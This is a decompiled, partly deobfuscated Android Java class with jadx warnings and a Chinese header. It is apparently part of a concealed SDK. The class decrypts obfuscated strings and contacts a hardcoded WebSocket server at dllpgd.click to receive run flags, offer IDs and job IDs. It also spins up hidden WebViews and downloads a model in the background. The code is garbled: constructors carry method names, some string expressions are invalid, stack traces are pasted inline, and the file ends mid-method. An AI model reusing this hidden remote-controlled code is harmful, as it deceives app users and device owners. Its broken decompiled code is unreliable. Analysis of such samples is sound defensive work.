/**
 * 完全反混淆的Java类
 *
 * 原始: IlIlllIIlI1.llllIllIl1
 * 反混淆: com.crypto.DeobfuscationException
 *
 * 反混淆处理:
 * ✓ 包名重组: IlIlllIIlI1 → com.crypto
 * ✓ 类名重命名: llllIllIl1 → DeobfuscationException
 * ✓ 字符串解密: 8 个
 * ✓ 方法重命名
 * ✓ 变量改进
 */

package com.crypto;

import com.client.IIlIllIIll1;
import IlIlIIlIII1.Constants;
import android.app.ActivityManager;
import android.app.Application;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.os.SystemClock;
import android.webkit.WebView;
import c13.nim5.ez8.h5_proto.Atom;
import c13.nim5.ez8.h5_proto.Log;
import c13.nim5.ez8.h5_proto.signaling.CheckSignalingPluginStartResponse;
import java.util.Date;
import java.util.Iterator;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.CountDownLatch;
import java.util.regex.Pattern;
import lIllIlIll1.WebViewHook;

/* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1.class */
public class DeobfuscationException {

    /* renamed from: IIlIllIIll1, reason: collision with root package name */
    public static final String f260IIlIllIIll1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.decrypt(new byte[]{125, 31, 10, -126, 24, -96, -58, -59, 124, 0, 18}, new byte[]{25, 115, 102, -14, Byte.MAX_VALUE, -60, -103, -79});

    /* renamed from: llllIIIIll1, reason: collision with root package name */
    public Context f261llllIIIIll1;

    /* renamed from: IlIlIIlIII1, reason: collision with root package name */
    public IlIlIIlIII1.lIIIIlllllIlll1 f268IlIlIIlIII1;

    /* renamed from: lIIIIlllllIlll1, reason: collision with root package name */
    public boolean f262lIIIIlllllIlll1 = false;

    /* renamed from: llllIllIl1, reason: collision with root package name */
    public String f263llllIllIl1 = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;

    /* renamed from: IllIIlIIII1, reason: collision with root package name */
    public boolean f264IllIIlIIII1 = false;

    /* renamed from: IlIlllIIlI1, reason: collision with root package name */
    public String f265IlIlllIIlI1 = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;

    /* renamed from: IlIllIlllIllI1, reason: collision with root package name */
    public String f266IlIllIlllIllI1 = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;

    /* renamed from: llllllIlIIIlll1, reason: collision with root package name */
    public String f267llllllIlIIIlll1 = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;

    /* renamed from: lIllIIIlIl1, reason: collision with root package name */
    public final Handler f269lIllIIIlIl1 = new Handler(Looper.getMainLooper());

    /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$IllIIlIIII1.class */
    public class IllIIlIIII1 implements lIIIIlllllIlll1.IllIIlIIII1 {

        /* renamed from: llllIIIIll1, reason: collision with root package name */
        public final /* synthetic */ CountDownLatch f270llllIIIIll1;

        public isEnabled(CountDownLatch countDownLatch) {
            this.f270llllIIIIll1 = countDownLatch;
        }

        @Override // IlIlIIlIII1.lIIIIlllllIlll1.IllIIlIIII1
        public void decrypt(CheckSignalingPluginStartResponse checkSignalingPluginStartResponse, Exception exc) {
            String llllIIIIll12;
            try {
                if (exc != null) {
                    lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, exc.getMessage());
                } else if (checkSignalingPluginStartResponse == null || checkSignalingPluginStartResponse.getCode() != 0) {
                    if (checkSignalingPluginStartResponse != null) {
                        llllIIIIll12 = checkSignalingPluginStartResponse.getMessage();
                    } else {
                        byte[] byteArray = new byte[]{109, -60, 36, -45, -65, -43, -84, -97, 115, -34, 38, -52, -6};
                        byte[] keyArray = new byte[]{3, -79, 72, -65, -97, -89, -55, -20};
                        llllIIIIll12 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.decrypt(byteArray, keyArray);
                    }
                    lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll12);
                } else {
                    llllIllIl1.this.f264IllIIlIIII1 = checkSignalingPluginStartResponse.isRun();
                    llllIllIl1.this.f265IlIlllIIlI1 = checkSignalingPluginStartResponse.getOfferId();
                    llllIllIl1.this.f266IlIllIlllIllI1 = checkSignalingPluginStartResponse.getJobId();
                    if (llllIllIl1.this.f264IllIIlIIII1) {
                        lllllIllIl1.lIIIIlllllIlll1 liiiilllllilll1 = lllllIllIl1.lIIIIlllllIlll1.f773llllllIlIIIlll1;
                        byte[] encryptedData = new byte[14];
                        encryptedData[0] = -28;
                        encryptedData[1] = 88;
                        encryptedData[2] = -56;
                        encryptedData[3] = -99;
                        encryptedData[4] = -41;
                        encryptedData[5] = -93;
                        encryptedData[6] = -116;
                        encryptedData[7] = -34;
                        encryptedData[8] = -61;
                        encryptedData[9] = 87;
                        encryptedData[10] = -51;
                        encryptedData[11] = Byte.MIN_VALUE;
                        encryptedData[12] = -26;
                        encryptedData[13] = -73;
                        byte[] decryptionKey = new byte[]{-83, 54, -95, -23, -120, -48, -27, -71};
                        IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
                        String llllIIIIll13 = lllliiiill1.decrypt(encryptedData, decryptionKey);
                        StringBuilder sb = new StringBuilder();
                        byte[] bArr5 = new byte[22];
                        bArr5[0] = Byte.MIN_VALUE;
                        bArr5[1] = 84;
                        bArr5[2] = -108;
                        bArr5[3] = 106;
                        bArr5[4] = 22;
                        bArr5[5] = -54;
                        bArr5[6] = -6;
                        bArr5[7] = 17;
                        bArr5[8] = -110;
                        bArr5[9] = 24;
                        bArr5[10] = Byte.MIN_VALUE;
                        bArr5[11] = 76;
                        bArr5[12] = 23;
                        bArr5[13] = -62;
                        bArr5[14] = -2;
                        bArr5[15] = 15;
                        bArr5[16] = -78;
                        bArr5[17] = 18;
                        bArr5[18] = -59;
                        bArr5[19] = 57;
                        bArr5[20] = 81;
                        bArr5[21] = -122;
                        byte[] bArr6 = new byte[]{-5, 118, -25, 3, 113, -92, -101, 125};
                        StringBuilder append = sb.append(lllliiiill1.decrypt(bArr5, bArr6)).append(llllIllIl1.this.f265IlIlllIIlI1);
                        byte[] bArr7 = new byte[]{-79, 9, 9, 69, -87, 98, 18, -41, -14, 73, 64, 9, -67, 65, 26, -37, -38, 65, 11, 93, -6, 41};
                        byte[] bArr8 = new byte[]{-109, 37, 41, 103, -38, 11, 117, -71};
                        StringBuilder append2 = append.append(lllliiiill1.decrypt(bArr7, bArr8)).append(llllIllIl1.this.f266IlIllIlllIllI1);
                        byte[] bArr9 = new byte[]{-7, 124};
                        byte[] bArr10 = new byte[]{-37, 1, -123, 54, 66, -9, 70, 96};
                        liiiilllllilll1.decrypt(llllIIIIll13, append2.append(lllliiiill1.decrypt(bArr9, bArr10)).toString());
                    } else {
                        byte[] bArr11 = new byte[]{77, -51, 120, -125, 69, 121, 76, -77, 12, -78, 121, -26, 49, 88, 15, -45, 44, -43};
                        byte[] bArr12 = new byte[]{-85, 90, -40, 106, -39, -7, -86, 58};
                        lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.INFO, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.decrypt(bArr11, bArr12));
                    }
                }
            } finally {
                this.f270llllIIIIll1.countDown();
            }
        }
    }

    /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$lIIIIlllllIlll1.class */
    public class lIIIIlllllIlll1 implements Runnable {
        public getClassLoader() {
        }

        /* JADX WARN: Failed to calculate best type for var: r0v0 ??
        java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.calculateFromBounds(FixTypesVisitor.java:156)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.setBestType(FixTypesVisitor.java:133)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.deduceType(FixTypesVisitor.java:238)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryDeduceTypes(FixTypesVisitor.java:221)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
         */
        /* JADX WARN: Failed to calculate best type for var: r0v0 ??
        java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
        	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.calculateFromBounds(TypeInferenceVisitor.java:145)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.setBestType(TypeInferenceVisitor.java:123)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.lambda$runTypePropagation$2(TypeInferenceVisitor.java:101)
        	at java.base/java.util.ArrayList.forEach(ArrayList.java:1597)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runTypePropagation(TypeInferenceVisitor.java:101)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:75)
         */
        /* JADX WARN: Multi-variable type inference failed. Error: java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.RegisterArg.getSVar()" because the return value of "jadx.core.dex.nodes.InsnNode.getResult()" is null
        	at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.collectRelatedVars(AbstractTypeConstraint.java:31)
        	at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.<init>(AbstractTypeConstraint.java:19)
        	at jadx.core.dex.visitors.typeinference.TypeSearch$1.<init>(TypeSearch.java:376)
        	at jadx.core.dex.visitors.typeinference.TypeSearch.makeMoveConstraint(TypeSearch.java:376)
        	at jadx.core.dex.visitors.typeinference.TypeSearch.makeConstraint(TypeSearch.java:361)
        	at jadx.core.dex.visitors.typeinference.TypeSearch.collectConstraints(TypeSearch.java:341)
        	at java.base/java.util.ArrayList.forEach(ArrayList.java:1597)
        	at jadx.core.dex.visitors.typeinference.TypeSearch.run(TypeSearch.java:60)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.runMultiVariableSearch(FixTypesVisitor.java:116)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
         */
        /* JADX WARN: Not initialized variable reg: 0, insn: 0x0168: MOVE (r2 I:??) = (r0 I:??), block:B:7:0x0009 */
        /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.Throwable] */
        @Override // java.lang.Runnable
        public void run() {
            ?? r0;
            try {
                IIlIllIIll1.decrypt();
            } catch (Throwable unused) {
                lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1."H5V1Refactor init checkAndDownloadAiModel error: " + r0.getMessage());
            }
        }
    }

    /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$llllIIIIll1.class */
    public class llllIIIIll1 implements Runnable {

        /* renamed from: llllIIIIll1, reason: collision with root package name */
        public final /* synthetic */ WebView[] f273llllIIIIll1;

        public decrypt(WebView[] webViewArr) {
            this.f273llllIIIIll1 = webViewArr;
        }

        @Override // java.lang.Runnable
        public void run() {
            this.f273llllIIIIll1[0] = new WebView(IlIlllIIlI1.lIIIIlllllIlll1.getWebViewProvider());
        }
    }

    /* renamed from: IlIlllIIlI1.llllIllIl1$llllIllIl1, reason: collision with other inner class name */
    /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$llllIllIl1.class */
    public class C0009llllIllIl1 extends TimerTask {

        /* renamed from: IlIlllIIlI1.llllIllIl1$llllIllIl1$lIIIIlllllIlll1 */
        /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$llllIllIl1$lIIIIlllllIlll1.class */
        public class lIIIIlllllIlll1 implements Runnable {

            /* renamed from: llllIIIIll1, reason: collision with root package name */
            public final /* synthetic */ WebView[] f276llllIIIIll1;

            public getClassLoader(WebView[] webViewArr) {
                this.f276llllIIIIll1 = webViewArr;
            }

            @Override // java.lang.Runnable
            public void run() {
                this.f276llllIIIIll1[0] = new WebView(IlIlllIIlI1.lIIIIlllllIlll1.getWebViewProvider());
            }
        }

        /* renamed from: IlIlllIIlI1.llllIllIl1$llllIllIl1$llllIIIIll1 */
        /* loaded from: classes.jar:IlIlllIIlI1/llllIllIl1$llllIllIl1$llllIIIIll1.class */
        public class llllIIIIll1 implements Runnable {
            public decrypt() {
            }

            /* JADX WARN: Failed to calculate best type for var: r0v0 ??
            java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.calculateFromBounds(FixTypesVisitor.java:156)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.setBestType(FixTypesVisitor.java:133)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.deduceType(FixTypesVisitor.java:238)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryDeduceTypes(FixTypesVisitor.java:221)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
             */
            /* JADX WARN: Failed to calculate best type for var: r0v0 ??
            java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.InsnArg.getType()" because "changeArg" is null
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.moveListener(TypeUpdate.java:439)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.runListeners(TypeUpdate.java:232)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.requestUpdate(TypeUpdate.java:212)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeForSsaVar(TypeUpdate.java:183)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.updateTypeChecked(TypeUpdate.java:112)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:83)
            	at jadx.core.dex.visitors.typeinference.TypeUpdate.apply(TypeUpdate.java:56)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.calculateFromBounds(TypeInferenceVisitor.java:145)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.setBestType(TypeInferenceVisitor.java:123)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.lambda$runTypePropagation$2(TypeInferenceVisitor.java:101)
            	at java.base/java.util.ArrayList.forEach(ArrayList.java:1597)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.runTypePropagation(TypeInferenceVisitor.java:101)
            	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:75)
             */
            /* JADX WARN: Multi-variable type inference failed. Error: java.lang.NullPointerException: Cannot invoke "jadx.core.dex.instructions.args.RegisterArg.getSVar()" because the return value of "jadx.core.dex.nodes.InsnNode.getResult()" is null
            	at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.collectRelatedVars(AbstractTypeConstraint.java:31)
            	at jadx.core.dex.visitors.typeinference.AbstractTypeConstraint.<init>(AbstractTypeConstraint.java:19)
            	at jadx.core.dex.visitors.typeinference.TypeSearch$1.<init>(TypeSearch.java:376)
            	at jadx.core.dex.visitors.typeinference.TypeSearch.makeMoveConstraint(TypeSearch.java:376)
            	at jadx.core.dex.visitors.typeinference.TypeSearch.makeConstraint(TypeSearch.java:361)
            	at jadx.core.dex.visitors.typeinference.TypeSearch.collectConstraints(TypeSearch.java:341)
            	at java.base/java.util.ArrayList.forEach(ArrayList.java:1597)
            	at jadx.core.dex.visitors.typeinference.TypeSearch.run(TypeSearch.java:60)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.runMultiVariableSearch(FixTypesVisitor.java:116)
            	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:91)
             */
            /* JADX WARN: Not initialized variable reg: 0, insn: 0x0165: MOVE (r2 I:??) = (r0 I:??), block:B:7:0x0009 */
            /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.Throwable] */
            @Override // java.lang.Runnable
            public void run() {
                ?? r0;
                try {
                    IIlIllIIll1.decrypt();
                } catch (Throwable unused) {
                    lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1."H5V1Refactor init checkAndDownloadAiModel error: " + r0.getMessage());
                }
            }
        }

        public C0009llllIllIl1() {
        }

        @Override // java.util.TimerTask, java.lang.Runnable
        public void run() {
            try {
                new Thread(new decrypt()).start();
                IlIlIIlIII1 ilIlIIlIII1 = new initialize();
                byte[] byteArray = new byte[]{85, 59, 50, 87, 122, 123, 82, -124, 126, 122, 11, 20, 8, 106, 85, -106, 118, 46, 23, 18, 73, 108, 64, -70, 66, 81, 59, 57};
                byte[] keyArray = new byte[]{29, 14, 100, 102, 40, 30, 52, -27};
                lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.INFO, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.decrypt(byteArray, keyArray));
                WebView[] webViewArr = new WebView[1];
                IlIlllIIlI1.lIIIIlllllIlll1.decrypt(new getClassLoader(webViewArr));
                SystemClock.sleep(2000L);
                WebView webView = webViewArr[0];
                if (webView != null) {
                    ilIlIIlIII1.decrypt(webView);
                }
            } catch (Throwable unused) {
            }
        }
    }

    public Context isEnabled() {
        return this.f261llllIIIIll1;
    }

    public boolean lIllIIIlIl1() {
        return this.f262lIIIIlllllIlll1;
    }

    public boolean IIlIllIIll1() {
        return this.f264IllIIlIIII1;
    }

    public String llllllIlIIIlll1() {
        return this.f265IlIlllIIlI1;
    }

    public String IlIllIlllIllI1() {
        return this.f266IlIllIlllIllI1;
    }

    public IlIlIIlIII1.lIIIIlllllIlll1 IlIlllIIlI1() {
        return this.f268IlIlIIlIII1;
    }

    public final void initialize() {
        Context context = this.f261llllIIIIll1;
        IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
        IlIlIIlIII1.lIIIIlllllIlll1 liiiilllllilll1 = new IlIlIIlIII1.getClassLoader(context, new lIIIIlllllIlll1.IlIlllIIlI1(lllliiiill1.decrypt(new byte[]{-54, 84, -81, Byte.MAX_VALUE, 31, -11, 39, 20, -58, 76, -73, Byte.MAX_VALUE, 11, -85, 38, 88, -50, 73, -72, 100}, new byte[]{-94, 32, -37, 15, 108, -49, 8, 59}), "wss://dllpgd.click/signaling_ws", lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, true, 30L));
        liiiilllllilll1.getWebViewProvider();
        this.f268IlIlIIlIII1 = liiiilllllilll1;
    }

    public String getWebViewProvider() {
        return this.f267llllllIlIIIlll1;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v0, types: [boolean] */
    /* JADX WARN: Type inference failed for: r0v1, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v7, types: [IlIlIIlIII1.lIIIIlllllIlll1] */
    public final void getClassLoader() {
        ?? llllIllIl12 = IIlIllIIll1.getWebViewProvider();
        if (llllIllIl12 != 0) {
            try {
                this.f264IllIIlIIII1 = false;
                CountDownLatch countDownLatch = new CountDownLatch(1);
                this.f268IlIlIIlIII1.decrypt(new isEnabled(countDownLatch));
                countDownLatch.await();
                if (this.f264IllIIlIIII1) {
                    return;
                }
                llllIllIl12 = this.f268IlIlIIlIII1;
                llllIllIl12.decrypt();
            } catch (Exception unused) {
                lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll1.lIIIIlllllIlll1.decrypt(llllIllIl12, new StringBuilder().append(IlIlllIIlI1.IllIIlIIII1."checkRunSignaling error: ")));
            }
        }
    }

    public void decrypt(Context context, String message) {
        decrypt(context, message, null);
    }

    public void decrypt(Context context, String message, Atom atom) {
        try {
            if (Build.VERSION.SDK_INT >= 28) {
                String processName = Application.getProcessName();
                byte[] byteArray = new byte[]{20};
                byte[] keyArray = new byte[]{46, 109, 4, 11, 88, -37, 41, 36};
                IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
                String llllIIIIll12 = lllliiiill1.decrypt(byteArray, keyArray);
                byte[] encryptedData = new byte[]{60};
                byte[] decryptionKey = new byte[]{99, -6, 56, 29, -29, -55, -75, -76};
                WebView.setDataDirectorySuffix(processName.replace(llllIIIIll12, lllliiiill1.decrypt(encryptedData, decryptionKey)));
            }
        } catch (Throwable unused) {
            System.out.println(IlIlllIIlI1.IllIIlIIII1."ERROR: Failed to initialize WebView");
        }
        this.f267llllllIlIIIlll1 = message;
        try {
            Context applicationContext = context.getApplicationContext();
            SystemClock.sleep(500L);
            this.f261llllIIIIll1 = applicationContext;
            IIlIllIIll1.f145lIllIlIll1 = applicationContext;
            this.f262lIIIIlllllIlll1 = IIlIllIIll1.IIlIllIIll1();
            IlIlllIIlI1.lIIIIlllllIlll1.decrypt(this);
            lllllIllIl1.llllIllIl1.f797IlIllIlllIllI1.decrypt(applicationContext);
            lllllIllIl1.lIIIIlllllIlll1.f773llllllIlIIIlll1.decrypt(applicationContext);
            byte[] bArr5 = new byte[]{85, -40, 5, -38, -85, -33, -123, 64, 126, -103, 60, -103, -39, -45, -115, 72, 105};
            byte[] bArr6 = new byte[]{29, -19, 83, -21, -7, -70, -29, 33};
            IllIIlIIII1.llllIIIIll1 lllliiiill12 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
            String llllIIIIll13 = lllliiiill12.decrypt(bArr5, bArr6);
            Log.LogLevel logLevel = Log.LogLevel.INFO;
            lllllIllIl1.IllIIlIIII1.getClassLoader(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll13);
            llllllIlIIIlll1.llllIIIIll1.getClassLoader(applicationContext, message);
            if (atom != null) {
                llllllIlIIIlll1.llllIIIIll1.f807lIIIIlllllIlll1 = atom;
            }
            StringBuilder sb = new StringBuilder();
            byte[] bArr7 = new byte[]{-67, 10, 48, -21, -120, 0, -42, -59, -106, 75, 9, -88, -6, 4, -60, -53, -104, 5, 70};
            byte[] bArr8 = new byte[]{-11, 63, 102, -38, -38, 101, -80, -92};
            lllllIllIl1.IllIIlIIII1.getClassLoader(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, sb.append(lllliiiill12.decrypt(bArr7, bArr8)).append(llllllIlIIIlll1.llllIIIIll1.decrypt().toJSONObject()).toString());
            byte[] bArr9 = new byte[]{106, -48, -117, -89, -54, 72, 113, 90, 30, -118, -93, -34, -92, 79, 32, 1, 15, -20, -4, -6, -7, 42, 42, 125};
            byte[] bArr10 = new byte[]{-113, 109, 24, 66, 67, -59, -106, -25};
            lllllIllIl1.IllIIlIIII1.getClassLoader(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.decrypt(bArr9, bArr10).concat(IlIlIIIlIlIlll1.IlIlIIlIII1.decrypt(applicationContext)));
            decrypt(applicationContext);
            byte[] bArr11 = new byte[]{-74, 77, -59, 119, -83, -119, 115, 68, -80, 93, -19, 101, -73, -57, 70, 88, -69};
            byte[] bArr12 = new byte[]{-33, 62, -120, 22, -60, -25, 35, 54};
            lllllIllIl1.IllIIlIIII1.getClassLoader(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.decrypt(bArr11, bArr12));
            IlIllIlllIllI1.llllIIIIll1.lIllIIIlIl1();
            IlIllll1.lIIIIlllllIlll1.decrypt(applicationContext, IlIllIlllIllI1.llllIIIIll1.IlIlllIIlI1());
            byte[] bArr13 = new byte[]{-86, -106, -18, 48, 43, 34, -82, -6};
            byte[] bArr14 = new byte[]{-62, -7, -127, 91, 11, 71, -64, -98};
            lllllIllIl1.IllIIlIIII1.getClassLoader(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.decrypt(bArr13, bArr14));
            WebView[] webViewArr = new WebView[1];
            IlIlllIIlI1.lIIIIlllllIlll1.decrypt(new decrypt(webViewArr));
            SystemClock.sleep(2000L);
            if (webViewArr[0] == null) {
                return;
            }
            if (!IIIlIllIlI1.IlIlIIlIII1.isEnabled()) {
                byte[] bArr15 = new byte[43];
                bArr15[0] = 2;
                bArr15[1] = 40;
                bArr15[2] = -117;
                bArr15[3] = -123;
                bArr15[4] = 43;
                bArr15[5] = -13;
                bArr15[6] = 36;
                bArr15[7] = -86;
                bArr15[8] = 41;
                bArr15[9] = 105;
                bArr15[10] = -78;
                bArr15[11] = -58;
                bArr15[12] = 89;
                bArr15[13] = 115;
                bArr15[14] = -46;
                bArr15[15] = 100;
                bArr15[16] = -81;
                bArr15[17] = -105;
                bArr15[18] = 117;
                bArr15[19] = 81;
                bArr15[20] = -35;
                bArr15[21] = 39;
                bArr15[22] = -86;
                bArr15[23] = Byte.MAX_VALUE;
                bArr15[24] = -17;
                bArr15[25] = -14;
                bArr15[26] = 97;
                bArr15[27] = 56;
                bArr15[28] = -99;
                bArr15[29] = 46;
                bArr15[30] = -49;
                bArr15[31] = 45;
                bArr15[32] = -34;
                bArr15[33] = -78;
                bArr15[34] = 59;
                bArr15[35] = 56;
                bArr15[36] = -8;
                bArr15[37] = Byte.MAX_VALUE;
                bArr15[38] = -33;
                bArr15[39] = 82;
                bArr15[40] = -93;
                bArr15[41] = -126;
                bArr15[42] = 110;
                byte[] bArr16 = new byte[]{74, 29, -35, -76, 121, -106, 66, -53};
                lllllIllIl1.IllIIlIIII1.getClassLoader(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.decrypt(bArr15, bArr16));
                return;
            }
            if (!decrypt()) {
                byte[] bArr17 = new byte[]{13, -65, -39, 117, 83, -52, -10, -35, 38, -2, -32, 54, 33, -64, -2, -43, 49, -86, -44, 101, 98, -63, -11, -33, 46, -55, -18, 42, 83, -36, -2, -108, 108, -41};
                byte[] bArr18 = new byte[]{69, -118, -113, 68, 1, -87, -112, -68};
                lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.decrypt(bArr17, bArr18));
                return;
            }
            initialize();
            byte[] bArr19 = new byte[26];
            bArr19[0] = -80;
            bArr19[1] = 31;
            bArr19[2] = -60;
            bArr19[3] = -112;
            bArr19[4] = -116;
            bArr19[5] = 26;
            bArr19[6] = 96;
            bArr19[7] = -63;
            bArr19[8] = -70;
            bArr19[9] = 3;
            bArr19[10] = -14;
            bArr19[11] = -102;
            bArr19[12] = Byte.MIN_VALUE;
            bArr19[13] = 84;
            bArr19[14] = 104;
            bArr19[15] = -61;
            bArr19[16] = -70;
            bArr19[17] = 25;
            bArr19[18] = -58;
            bArr19[19] = -96;
            bArr19[20] = -125;
            bArr19[21] = 81;
            bArr19[22] = 41;
            bArr19[23] = -54;
            bArr19[24] = -67;
            bArr19[25] = 19;
            byte[] bArr20 = new byte[]{-45, 119, -95, -13, -25, 58, 9, -81};
            lllllIllIl1.IllIIlIIII1.getClassLoader(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.decrypt(bArr19, bArr20));
            getClassLoader();
            byte[] bArr21 = new byte[]{106, 3, -125, -59, -68, 28, -120, 71, 90, 2, -127, -56, -74, 34, -108, 71, 110, 75, -125, -56, -77};
            byte[] bArr22 = new byte[]{9, 107, -26, -90, -41, 78, -3, 41};
